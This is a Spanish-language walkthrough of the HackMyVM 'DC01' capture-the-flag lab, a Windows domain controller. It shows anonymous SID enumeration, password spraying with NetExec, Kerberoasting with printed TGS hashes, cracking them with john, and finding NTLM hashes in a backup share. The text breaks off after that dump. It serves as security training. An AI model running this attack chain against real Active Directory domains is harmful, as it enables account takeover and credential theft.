---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# DC01 HackMyVM (Easy - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-27 13:28 EDT
Nmap scan report for 192.168.28.9
Host is up (0.00034s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-28 01:28:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:11:1F:48 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:11:1f:48 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2025-03-28T01:29:16
|_  start_date: N/A
|_clock-skew: 7h59m57s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.14 seconds
```

No vemos que haya una pagina web, pero si vemos que hay un dominio asociado llamado `SOUPEDECODE.LOCAL`, vemos tambien que el `DC (Domain Controller)` se llama `DC01`, por lo que ya podremos deducir que tiene un `Active Directory` con su autenticacion de `Kerberos`, etc...

Vamos añadir el dominio a nuestro archivo `hosts`:

```shell
nano /etc/hosts

#Dentro del nano
<IP>             SOUPEDECODE.LOCAL
```

Lo guardamos y con esto ya podremos tener conexion con la maquina victima a nivel de `dominio`.

## SMB

Vamos a enumerar los recursos compartidos del servidor `SMB` que hemos visto que tiene, de la siguiente forma:

```shell
smbclient -L //SOUPEDECODE.LOCAL/ -N
```

Info:

```
Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to SOUPEDECODE.LOCAL failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Vemos varios recursos compartidos bastante interesantes, por lo que vamos a `fuzzear` un poco.

Pero veremos que no nos deja de forma anonima practicamente nada, por lo que vamos a utilizar una herramienta para intentar enumerar los usuarios del `dominio` a ver si tuvieramso suerte.

### impacket-lookupsid

```shell
impacket-lookupsid anonymous@SOUPEDECODE.LOCAL
```

Dejamos la contraseña vacia.

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at SOUPEDECODE.LOCAL
[*] StringBinding ncacn_np:SOUPEDECODE.LOCAL[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
502: SOUPEDECODE\krbtgt (SidTypeUser)
512: SOUPEDECODE\Domain Admins (SidTypeGroup)
513: SOUPEDECODE\Domain Users (SidTypeGroup)
514: SOUPEDECODE\Domain Guests (SidTypeGroup)
515: SOUPEDECODE\Domain Computers (SidTypeGroup)
516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
518: SOUPEDECODE\Schema Admins (SidTypeGroup)
519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
525: SOUPEDECODE\Protected Users (SidTypeGroup)
526: SOUPEDECODE\Key Admins (SidTypeGroup)
527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
1000: SOUPEDECODE\DC01$ (SidTypeUser)
1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
1103: SOUPEDECODE\bmark0 (SidTypeUser)
1104: SOUPEDECODE\otara1 (SidTypeUser)
1105: SOUPEDECODE\kleo2 (SidTypeUser)
1106: SOUPEDECODE\eyara3 (SidTypeUser)
1107: SOUPEDECODE\pquinn4 (SidTypeUser)
1108: SOUPEDECODE\jharper5 (SidTypeUser)
1109: SOUPEDECODE\bxenia6 (SidTypeUser)
1110: SOUPEDECODE\gmona7 (SidTypeUser)
1111: SOUPEDECODE\oaaron8 (SidTypeUser)
1112: SOUPEDECODE\pleo9 (SidTypeUser)
1113: SOUPEDECODE\evictor10 (SidTypeUser)
1114: SOUPEDECODE\wreed11 (SidTypeUser)
1115: SOUPEDECODE\bgavin12 (SidTypeUser)
1116: SOUPEDECODE\ndelia13 (SidTypeUser)
1117: SOUPEDECODE\akevin14 (SidTypeUser)
1118: SOUPEDECODE\kxenia15 (SidTypeUser)
1119: SOUPEDECODE\ycody16 (SidTypeUser)
1120: SOUPEDECODE\qnora17 (SidTypeUser)
1121: SOUPEDECODE\dyvonne18 (SidTypeUser)
1122: SOUPEDECODE\qxenia19 (SidTypeUser)
1123: SOUPEDECODE\rreed20 (SidTypeUser)
1124: SOUPEDECODE\icody21 (SidTypeUser)
1125: SOUPEDECODE\ftom22 (SidTypeUser)
1126: SOUPEDECODE\ijake23 (SidTypeUser)
1127: SOUPEDECODE\rpenny24 (SidTypeUser)
1128: SOUPEDECODE\jiris25 (SidTypeUser)
1129: SOUPEDECODE\colivia26 (SidTypeUser)
1130: SOUPEDECODE\pyvonne27 (SidTypeUser)
1131: SOUPEDECODE\zfrank28 (SidTypeUser)
1132: SOUPEDECODE\ybob317 (SidTypeUser)
1133: SOUPEDECODE\file_svc (SidTypeUser)
1134: SOUPEDECODE\charlie (SidTypeUser)
1135: SOUPEDECODE\qethan32 (SidTypeUser)
1136: SOUPEDECODE\khenry33 (SidTypeUser)
1137: SOUPEDECODE\sjudy34 (SidTypeUser)
1138: SOUPEDECODE\rrachel35 (SidTypeUser)
1139: SOUPEDECODE\caiden36 (SidTypeUser)
1140: SOUPEDECODE\xbella37 (SidTypeUser)
1141: SOUPEDECODE\smark38 (SidTypeUser)
1142: SOUPEDECODE\zximena448 (SidTypeUser)
1143: SOUPEDECODE\fmike40 (SidTypeUser)
1144: SOUPEDECODE\yeli41 (SidTypeUser)
1145: SOUPEDECODE\knina42 (SidTypeUser)
..................<RESTO_DE_USUSARIOS>.........................................
```

Vemos que nos ha funcionado, por lo que vamos a obtener solamente los usuarios para generar una lista de la siguiente forma:

```shell
impacket-lookupsid anonymous@SOUPEDECODE.LOCAL | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```

> users.txt

```
Administrator
Guest
krbtgt
DC01$
bmark0
otara1
kleo2
eyara3
pquinn4
jharper5
bxenia6
gmona7
oaaron8
pleo9
evictor10
wreed11
bgavin12
ndelia13
akevin14
kxenia15
ycody16
qnora17
dyvonne18
qxenia19
rreed20
icody21
ftom22
ijake23
rpenny24
jiris25
colivia26
pyvonne27
zfrank28
ybob317
file_svc
charlie
qethan32
khenry33
sjudy34
rrachel35
caiden36
xbella37
smark38
zximena448
fmike40
yeli41
knina42
vhelen43
xoliver44
jxander45
czane46
rwendy47
usean48
fhenry49
xkaren50
rbianca51
mmona52
znora53
zlila54
lliam55
znathan56
kbella57
malice58
gadam59
byara60
fpenny61
tmona62
iuma63
voscar64
mpeter65
suna66
bmegan67
..................<RESTO_DE_USUSARIOS>.........................................
```

Ahora con esta lista de usuarios vamos a realizar fuerza bruta mediante el servidor `SMB` con la herramienta `NetExec`.

## NetExec

Vamos a probar la misma lista de usuarios como contraseña, por si algun usuario tuviera su contraseña como su nombre de usuario.

```shell
netexec smb <IP> -d SOUPEDECODE.LOCAL -u users.txt -p users.txt --ignore-pw-decoding
```

Info:

```
SMB   192.168.28.9    445    DC01   [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

Esperando un rato veremos que nos encontro las credenciales:

```
User: ybob317
Pass: ybob317
```

Ahora vamos a probar a enumerar los recursos compartidos del servidor `SMB` con las siguientes credenciales.

### SMB con ybob317

```shell
smbclient -L //SOUPEDECODE.LOCAL/ -U ybob317
```

Info:

```
		Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to SOUPEDECODE.LOCAL failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Si entramos en el recurso compartido llamado `Users`:

```shell
smbclient //SOUPEDECODE.LOCAL/Users -U ybob317
```

Si listamos veremos lo siguiente:

```
  .                                  DR        0  Thu Jul  4 18:48:22 2024
  ..                                DHS        0  Mon Jun 17 13:42:50 2024
  admin                               D        0  Thu Jul  4 18:49:01 2024
  Administrator                       D        0  Sat Jun 15 15:56:40 2024
  All Users                       DHSrn        0  Sat May  8 04:26:16 2021
  Default                           DHR        0  Sat Jun 15 22:51:08 2024
  Default User                    DHSrn        0  Sat May  8 04:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 04:14:03 2021
  Public                             DR        0  Sat Jun 15 13:54:32 2024
  ybob317                             D        0  Mon Jun 17 13:24:32 2024

                12942591 blocks of size 4096. 10877170 blocks available
```

Vemos que se esta compartiendo la carpeta de `C:\Users` de `Windows` por lo que leeremos la flag del usuario.

> user.txt

```
6bab1f09a7403980bfeb4c2b412be47b
```

Vemos que no podemos listar ningun recurso compartido mas, por lo que vamos a intentar realizar un `Kerberoasting` hacia el `Active Directory` de la maquina victima de `Windows`.

### Kerberoasting (ATTACK)

```shell
impacket-GetUserSPNs -dc-ip <IP> 'SOUPEDECODE.LOCAL/ybob317:ybob317' -request
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 13:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 13:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 13:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 13:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 13:29:18.511871  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$f7078f9042b92c0407d372ec8dbb9ecc$ec776606e2d71886aa9f029017da197448a217447a6fbd64b8808b95e1ee0f4ab371bfdd847bf24f200681778fa3e2fe75aa1d3f9204a3813917521233bfb37136939ceb2a1a8239da48794a19591f78897c1821a7d509bc2c28d81333a5eef533dfee280c262b2219192bd027e646c2d661a6fbc7559b2e286ba20ede0662bb58356cacfcf9e55d7fc3687b2f2dd7ea5db821d6c22632ce977bb1c2cd4da2c122764385aa661015127f679097b11211624bc85ae67f4d01cb2efd3c0a29b54368c909827c9c26dd6480d9386da3819ad20a41a1a4aa28f240f334d8caf4a48e94d5b37ce7dfdbbebd5071e033147dc02e78b0f6fb993d4ebf582fd4beb041e6e4d8e87a7eaef6eb290fd4694ca7cd035557492f6410411253df0a05f573bfbcb738130f781d09359cbf4c502e51a8db8a38a433d2084b5814c35f8775d0fcd523233e35e8ce2afd96247cb9a4c3bd04a527aef3898b7740d39dd54847c99621468be82f2c2f6316e82d7a6bc27467d1d1e1b210189d1976d16215423b7204af7c2e24828f34a4fbd6395c5c3b9f26344c52650dc2b8b9f5679f26d59fcc3bd451408acaf1fa232937770af1e3a483966910d581a3cdc73bf25e26276aa12a0254614f0506b876ba2038e8113f561db9e04975fc3555aa79f3d5b8a640e1f403ba036ff3f250323644040da81d4ad7082f4c89648303a28dbe8203c99cfacc81010fdf2f569077be6c58e9ba7c3211c53cd8a89f07e52c2d5a98a827f7ce6b7095ece2ab2b3949b65f8d3050d86c661330d04f17f0fd662c6786ac112ad112de952cf10b4f44c4c7f811b3c9feaa5de2a2794d4b27825ff3b7034af819a55f38cadba8a0427507c455b30c724c3b8912ca5479c6b06d9539270ecf952708e66ac1edea124b95d219e3038a0c466a7a2a2a2793461a4e115eb7d06fb348712d19222333f24cf3c72e5a5e24aa0754cf5c83d29cb0deb1f49e2ff59c64472aa898989c5c49bf67d08ce46f21b5153ce2378fee50afeb8dd5881da44269c8f5ca6c6d5581ee1e22e953fcf29fda195d91eed9f38d5fb40768d56b5406bb590e178358674fa2db2d6d0603cf7ed26c43f96aff216e8dc95396aacc7aa3191afbcbcee6583bb257f345c1b16e6bf4c6968aaaf9f58078c6f978280d967b60dbf6a5c4facb0b29a32044f562a2c80cc4140bf4e4801dfe15f038d5ed928ae41b15eff1143d0fe18f4d9925449857d4dc13cef81266415cd4e088eccf79f8e9479fa89862fb27a35771d9387ea1ac335f5d677d1fc9d56a3536a00a9ed4985234c9110522d67452fa449508d3c740fbc684e5caf22c7d094e22a9b37e82b18de7f3c935c1c77d510e4b8ade37e7bb7c9aaf9c03ee7236d2d30e8a40b446cf2033ea80d247faed8ca8c29485eb43e36d28149431524c952ead45150beb29663c3412fd9f337569d390895b2e168b31f1316693131b54c5d975c8398aa951b0378c3f2b04ca
$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/firewall_svc*$0cef99f9d7981e0210d723068fb9fd86$fb3912975e5858aad88d4b1d3a7ea3f039c05cb707481099eb34886b7c4018c37c5eb4e7025d92143541e0f3922e23dafd41c44568e2af8a563453047ea0c056baf961fe2d63d475de7ab6846e50d4d333461f5aa5a86130eaae1e294b2be302ebc403d775f57fb87abd0953d50b4068a5ce854ad90c1c1c9a67372b8725fd75a5fff244f7b01b46183b004d6b50fe6cd77cba83cb4d0daf5e7902d9ea8c999cf70f7c5b0de960985ea60c87ed2e6dba0de250e62703be526f76f13db31edf45ec6aa5427f94c508a42c958c08e6f02f4a01f5ee37c3ddf5e1553dfe0e71edd9c247bd96d3cad6aa5ebbb0d27c75f4cb1da707ee9669ac6cddd6863f8571d669df65fda8ac513a5ed350b4b60aea28acc05c08669b3af926109fa9adc244de57b2d9142a05a4109260fef6932ca4f8c35a11cfe7bf652e31610c639896fa70ecdac3cb973496ec5cb2ae7cc6b7289379b5beb44e702d891e734e46429e0f115b1b442a9d56c8c0772feaeb1c8df015abde58a65bc568da98e04599260659b747d586b8e3b78d052e35ddfa4d90ed7281a8da0ba979eb0dd9a291e31ac1a80bcfbe4fd6518fa9e1378dc825b35f63a7e2e915326a061a8cc8b6eef253dc8bc9b3571fb3d6f3a610c566200e9eab60758cfabba93acabe82fe8f75f8a093bf242707daef90452ebce96373c57a7a26011c162fb099cb5a54cc02ce8249344cac374c604a6fd1846c3cb47041aaa977e6cb907ba56a1e76e5d6c09d1d9d1a4203a5c7ce2d886ef3c00d3b14bc01d8a786680f5143c26cd62ca3763c1405702ae50f550ad1f743e9199d28b2a8d6a6fbe8bef8bf82bae63b04d0edc5c81e0cc624de24684ae9d6a9ec174dc588446fa0cf8948a47cd57d02845b3f87bb2a5715cca89f6ae58e137ad6e9856b28c65ea591ff722b1798798355fd2819afd625b74f0760d8457c4d76ecf2480db1e5134445c895d6825db0cddc252429e2a1b6ce43ca6179678ed6e9c2689217ae17d160608da6e0919fc2b37194bd691b9e70e0c80f4fedde3a69f067dfac4b86c35315aa22f4dabf2829ccfb2bcf933bdcf1ebf5d89dd461d0648ce7d59aaae4daf55671ed8460be2255c129b77018ede05b70ba18d431ee0fc2214651b9aa644364f48086e5c26ba6b593992e49e62ca7f2a7bba472c6ca4c47b745ea34df4bc04168eeba52720310f1569f95294a3f961b59a301ca8bfce1a9b2ae39eefcade1f367b017a8bee25ec54c3fe01284e31c08749ad7ad5c31ef11f048873a1275e5f0e9cd8a20da98710288f40dc6a9663ca629490acf62e61b3bf6a89f619293c6719cd244bd549695cf20661a4a38eedbf6c1f6d3e8ee479e4f7bd18a74c5d7c98ecfd456252c34e7e7fc088312aee5ca19b9a32bb9798498e5028e9134a16744f9c85358a44961c955b83eaef2c3abb6882600f27288644e7fbc4edce0f67e68204354434d741c9c4e49b750f70e7e0aab5cad22e6
$krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/backup_svc*$0e1916452db602fe711bca18c684d57b$47cc4d29fc6e84b9c596d5c69d1071898129eae6d44d45dbd95deef08dc74c846107d9993c1876ef662224eaa22077bc9bded8b9e91af46106a03f735910687dbeaa3f806f21de16fb64c73d596f52dc8c2d20dcd7f76e425ce0982e0464062ab1ed174fd4371ad065658504ae434e5ec2317e9859ad4531c1ac9d2d02e63a9bccbfb0f33eb0a418e6b8943ee5d0cc491fd2a4cd986d6fc851b054964e4b855cfd02fb1520e26d2b9da073a8a396690849d3321e90690acc909ccb2308d54a07d771ce49ff2e45fda54efa70da7627df235f7a29a3bd77f0899d0261fdfcba33ad84d2db8235cf0c933c32ee2f68f569a85ff42074c520dd25795a70e88a7239eab9cd7318b2ffd9718683a1bb5ba539f6cad91ed077eed8b1bec8e8174efab097815dfc18fa1d4789b2021344d86a02d7eca1471872f762f8ce2513d273f5b5868c295a0155ef8222c80f78b8bb2dfda17e34b56fb3cec476966c6441ab248561e17da965beb60416c40cf24aae572b8480cecd8309b9ec44d7ed04b7af4c64e512e810c9348054c6282923c20ba41562fbde12a1c1eaf7be52e2a4000af552a117e60fa7ab2bb0a88b406caf39c63f21042a42d05755ac3a25ab33430764456945009699340a5d79b7733023d1d0271e86b0d1c73c5e034b4706a45a8e9a078c45e86fc9861d304e83eb4c83be3da9d891db81c01d52d84066970e6cb670a9f30e92609487013dc334548e44d10d40f3ce599edeb790b1d930c64cf964315ae31c3bc23722b9c6da688a14089ee00a13265ace0e7046727ad48ca626941788a19ef218724234670c163d92514245d98bebed130af1e64d615e0c9a790eadd69793f904f74aaeabc6dff4a0e3c335f67ae39e8ea03c1ec08e64aece7ea031f7970b2521bed517d55ed48f35e49c2b5d22bbcb25163f5de71ba11acf195b6e9b5ff4e28743d11f44ced5c324d5e29b97932061313a4638204cee6d172b252ff9e314a6281e1a4514fce19139ba454233d11ff48891b981439419949f671712f52763c4f9c93c0d939d6e1ff645b50c46e1e6ef0ceb3f72f8c6a4c823104a5847c94fdac13c4cf278de0bbf1bc38642fed865940b8771e9a6ea41aa36516beb79c6fb0ad7630e6e3f584fc72cbd8a8e8b533e5db51f3387d42c79641444f063879555f1e0830f405b4a9617f409782e717d61275f1f1183df55b4e1d3421ae9f033a22b734d0b07326923ddca1c4a52621eaa7b8ae6d1c93582845c88ab5f9e280a54553c844f485d0d1bf574047f1c2305b763798b5b7e83aa0cbf59b6b2f008168d0cdb8ae5d7f1bea0c35328dd23c68a4fb113ca339f4d1ff967861de9936fa8643204689142e910e06ccfd02b2cc0ee805164352f157b4d4562d990b4a0f6acc1004157c9ed5bc9b8add6cd95eaa74315d8d591acee0b838c0514f469710a83e8dae79170dd0e06a5eae3d1486942506fd9df21dea5c416c4404f5133a23c80
$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/web_svc*$4d23b9a81d2daae73ef8061a1800f427$da413ecce60acb6c2fbdee85ef0257216261ca3c7c6da99e7ab28abb5fd1f3db52c513e87ad1a82e4b57846c8d338ff1c9b60e773cb9b0c0233816cd0f9d1a91059b41ac3a101b8bcf5a63cb8da509c1f3b3ecbd6fd5100c105d5ff23dea9ab9f1db0f1104a5e0a1c5aa96bd4085d754c3ee2014e82c0272b053ccf055b9c524beb6dd81c1a28cfb29fc9a6a169ebd80bcb3b896df11adfce6ed63fca5097ef1cdafd78125d8e032b430dfacdc7af93a3bc6cb8d8f29b13f4eca1d7da736922971ce3c7106782922fed5ed40bec7d94cdaec04fab8de0a15ed2a97907e33fd38749a66cf5de6ddfd77b3724aabee3e3e73767f33a8e3023607e4cf941ddc3a44f509c83905ac6ccb9a4f37f5bf3705ff4f37b9bb0b7ec29e57342c13f3d39c7c652b9a2cc6f6d718fb09ee8f34b928888ad5a27335c53b099011109aae817115b8c4fe60363240dad07dad6077c382c6fbe676b14a77b92191366c03b31d975af587698f2bbfba31b0b4f52a2c581464cc0de8b3a09305ad2068cd03c48817617ac37c12e20381a2ab2c57b93a90af6d445b6787ac38ad7afc1c17b70d91753b704bdcbc4044fd7d9d6aacc04a7f1b44072c2641b1037dfd66853d2274ddcde026f86731b2f4e0e91b561d32c3d2119b9c77e5b6a992b811fdf5ac00eb50a5aecd38f042002f41fe81c8b2c88e9e3052b015447248369274e89ef8fdc9be9e4591a14c36f98939a8701c74f99683e0ce2a813d3c027e9b493ea1cc7771bcd2edb54691b519ddc9f8ef8abb490ad4d07b22cd865cde14100853e9fd8261660825d5326f279cf04f1aba4ee2cd1a28d264b4800e66b72b20cc51ce144216f7ca70ced721b53b5306606f3dcd99a06bf257d07b6f31948ea6f5189f59468c965f42ce133e9b1bb77834f9b02a5803055b9a2f20e4289c4034ff9932f4bcb926a103645d791d79c0c7216217fb12c9d8d7f5d4dc86a28533c2cfce5e4d150deede97d6aafee91e68dedf3ba745f8ace269d719699425c2cf93dc8426fea53c354a2130008c7dd5d62378efeae8339884418573751ce546b181f9bc4edb4c89e9a7b704777c5f2f20640b3e5cb920c48cddfef3598ceb59732e775233cdaceb626681f2ce46d2f91cd8b88c01c65091a70fdfb15bedb27b291e2c7f3d3651de2cb5828aa229344cad0c745cf49e134226121889a70c8cbb01dc3d4f4778b98ddef191c18d3e5105a917b9de31abbd211ea2e4f6518ee7d81b1e46580cec6ca6589d226c3cd28ece9c15e1d4268c385469f2fd7d43d85fa03b0b7f936e02f6109953424e6ae0c6cba3fe77be6fcd9d954b4172789f281450487b810c64c281372c7b57c86d2e9b4f10aa1a73a7f6ef96892718f3a74a62949db3ba57fd4c25e10a45ec03b367613b6b2952edb1533f9e668e1dd4216ca2401352eed493e5445f4607674445dd0675ab18129f162e75dbd934d0204cabdda7ef7843485911fc8d86228ff6
$krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/monitoring_svc*$fc8dea387c6cf17d932cc506de849271$bdcd2ae291c66ffd7662db8105dc9dd685463b6570b9d376f30c9df83e68913dad46c96cb5a0e98dfdf8124e3f6a4c826044813575a3badf823def221c29155c6ab561a09cb9509d15df7bcbc0f4e70883253e2648e9081d5b8289b1b3d086a714519d4e97222603467d0a5ad4364f339a99d4cbed409587573ebb76121e773608d7478870f9a985c7ddd903a83191650d1d0d876470147d553cf85d131e6037187588742294998dbbf7617c4aef2b2aeaa1698517fe1ff55ca095337d9198e321ae83287d787be708b1e14297ff40c9288494cdee38dfaf779ca4fcca161ccd74eb9a9ca718131a6704e72cbd3b67d330ccc396232d3c75783c4e969ae8d5677033c71d5fed0be7644fb22544f5e4785e631e640ced27e08f6574f9b045dbc4caf7826f3ed15f6d723a0ff8728160ea5fc04d60355c1a228c24ab346e1461143e56bab5466399a2ecad80a02ba17080b6dc4d75c0b1462dacbb9cb58925021e548824c7494e7dd1108746612fa184e80ac2dff6c1ef533fe421b93ef77c0fd56d92d416af54843b00759e0526831e386d75033c1fc7b3a3e09c300e999b14277f56ac6e4971d3f08431e9598b08fd6e2eea74fb93c4b0fa6da98834e0ab79688a7d1068c9c04275a198b0519aff7b508a20028ab4fe722ad6060127d395737d6a734f237a4794a285923e3d76951f2c80ec189a61f63662588c1d67efd7a9689e99979469b1ea93a13348c28d5051a8d29e0a9c8d38b9895cb46472552ef331630d6fb0ed4cde354a8529c446916a47f8ad5ed13bd60612553a3d5d5f590c42906d4b563e85ff97761d07b490f6a580b960935d17ed00606d3ba404ff90cb53161be506b3d50774edca7f55731cdd4820487d22ef2805d0fc3f66003c746615175ecc5ea28f466944b9f9d9435ed1c95dac99c519ff32845c9f242c10fab72f0850de12d3d9300c22c76916c1e14347c7eec8732994bad683e518009ac87eadb1955b3bf0474bdea49d714b2be1b80c65b126ee580f0bc206c4ad7ffac61052a75d7eaac345d64bc37e10d9e57d8ff08116f39fc7ad9eda82445345a05f3a2c6cee0b71a373b12e86002ec6b3394f9588be6454dce3d0f8fe324ac4ac448113ba6d14ed53dac751f6e91685428cd3c5d703ead0a96f7ba41390f62158a5cfc897cf2df50d7ff06a890dc7191440c834303486de1ee810a32b0576e087e74e70eb64d0d5baf0c139d54ea8d0118bb87dce0ba4ed87846a7d0d049f35ad0e83d02559494758e70724b9ee9194bfd9d17ec2778d501f7faa8c879e2889f9adef8fdf89232be87c25ce0bd81f9589c0fd0e11ddb672667594504c3c05519df809d67413eb65d0f9fbd1c7bf28bda1c793a955373a478c96854cc2644b05e7c6c1337cf414af41cb5b3a73a15f0737be9ea2743528c666fc49ac031e0e7ae9fcc946dfb0fd08c8bebde017dde7e90f20d777ed283c26b7aa79a89ba225e6aa7885fcb8
```

Vemos los servicios que son vulnerables a un `Kerberoasting` mas sus `TGTs`, por lo que vamos a probar a intentar crackear los `hashes` obtenidos de la siguiente forma:

Antes vamos a guardar todos esos `hashes` en un archivo llamado `kerberosHash.txt`.

### Crack Hash Kerberos

```shell
john --wordlist=<WORDLIST> --format=krb5tgs kerberosHash.txt
```

Info:

```
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123!!    (?)     
1g 0:00:00:24 DONE (2025-03-28 11:56) 0.04110g/s 589550p/s 2799Kc/s 2799KC/s !!12Honey..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemos que nos saco las credenciales de un servicio llamado `file_svc`, por lo que ahora vamos a probar si con este `servicio` se pudiera acceder a los recursos compartidos del servidor `SMB`.

```shell
netexec smb <IP> -d SOUPEDECODE.LOCAL -u file_svc -p 'Password123!!' --ignore-pw-decoding
```

Info:

```
SMB         192.168.28.9    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.28.9    445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
```

Vemos que si funciona, por lo que vamos acceder alguno de los recursos compartidos que encontramos anteriormente.

```shell
smbclient //SOUPEDECODE.LOCAL/backup -U file_svc
```

Si listamos el recurso, veremos lo siguiente:

```
  .                                   D        0  Mon Jun 17 13:41:17 2024
  ..                                 DR        0  Mon Jun 17 13:44:56 2024
  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024

                12942591 blocks of size 4096. 10878651 blocks available
```

Vamos a pasarnoslo a la maquina `host`:

```shell
get backup_extract.txt
```

Si leemos lo que contiene veremos lo siguiente:

```
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

Vemos lo que parecen `hashes` de varios usuarios o servicios, pero el que vemos que nos interesa es el siguiente:

```
